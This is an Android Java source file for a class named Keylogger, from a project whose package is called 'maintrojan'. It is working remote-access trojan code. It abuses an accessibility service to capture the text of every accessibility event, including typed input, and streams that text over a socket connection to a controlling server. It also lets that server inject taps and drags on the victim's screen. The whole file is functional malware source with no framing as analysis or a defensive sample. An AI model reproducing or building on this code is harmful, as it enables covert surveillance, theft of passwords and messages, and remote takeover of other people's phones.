package com.example.maintrojan;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.WindowManager;

import androidx.annotation.RequiresApi;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;
import java.util.logging.LogRecord;

import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class Keylogger extends AccessibilityService {
    private static boolean START = false;
    final String TAG = "myTrojan";
    public static boolean SCOKET_FLAG = true;
    private String sockEvt = "logger";
    // Socket now managed by MyService
    public static Intent intent;
    public static int resCode;
    public Handler handler = new Handler();
    public Handler gestureHandler = new Handler();

    public static void start(){
        START = true;
    }
    public static void stop(){
        START = false;
    }
    
    private String charToString(List<CharSequence> cs){
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : cs) sb.append(s);
        return sb.toString();
    }
    @RequiresApi(api = Build.VERSION_CODES.N)
    public void click(float x, float y){
        Log.d(TAG, "dispatching click: x=" + x + ", y=" + y);
        Path p = new Path();
        p.moveTo(x, y);
        // Add a tiny lineTo to ensure it registers as a stroke/tap? 
        // Some devices ignore single-point paths in dispatchGesture.
        // But startLine is fine. Let's just increase duration to standard tap time (e.g. 50-100ms)
        GestureDescription.Builder builder = new GestureDescription.Builder();
        // StrokeDescription(path, startTime, duration)
        // startTime=0 (immediate), duration=50ms
        builder.addStroke(new GestureDescription.StrokeDescription(p, 0, 50));
        
        boolean res = dispatchGesture(builder.build(), new AccessibilityService.GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                super.onCompleted(gestureDescription);
                Log.d(TAG, "Gesture Completed");
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                super.onCancelled(gestureDescription);
                Log.d(TAG, "Gesture Cancelled");
            }
        }, gestureHandler);
        Log.d(TAG, "dispatchGesture result: " + res);
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    public  void  drag(float x1, float y1,float x2,float y2){
        Log.d(TAG, "dispatching event drag "+x1+" "+y1+" "+x2+" "+y2);
        Path p = new Path();
        p.moveTo(x1,y1);
        p.lineTo(x2,y2);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(p,100,100));
        dispatchGesture(builder.build(),null,gestureHandler);
    }

    @Override
    protected void onServiceConnected(){
//        Log.d(TAG,"[+] Connected "+START);
        if(START){
//            Log.d(TAG,"[+] Connected");
            if(SCOKET_FLAG && MyService.sock != null){
                MyService.sock.emit(sockEvt,"[+] Connected");
            }
            // Register this Keylogger instance with MyService for mouse control
            MyService.setKeyloggerInstance(this);
        }
        super.onServiceConnected();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent aEvt) {
        // Only process keylogger events if feature is enabled
        if (!BuildConfig.FEATURE_KEYLOGGER) {
            return;
        }
        
        if(START) {
            String evts = charToString(aEvt.getText());
            if (!evts.equals("")) {
//                Log.d(TAG, evts);
                if (SCOKET_FLAG && MyService.sock != null) {
                    MyService.sock.emit(sockEvt, evts);
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
        if(START){
            if (SCOKET_FLAG && MyService.sock != null){
                MyService.sock.emit(sockEvt,"[-] Interrupt");
            }
//            Log.d(TAG,"[-] Interrupt");
        }

    }

    @Override
    public void onDestroy() {
        if(START){
            if (SCOKET_FLAG && MyService.sock != null){
                if (SCOKET_FLAG){
                    MyService.sock.emit(sockEvt,"[-] Dissconnect");
                }
                MyService.sock.disconnect();
            }
//            Log.d(TAG,"[-] Dissconnect");
        }
        super.onDestroy();

    }

    @Override
    public void onCreate() {
        // Socket initialization moved to MyService.java
        // This service now only handles accessibility events when enabled
        // Access socket via MyService.sock
        super.onCreate();
    }
}
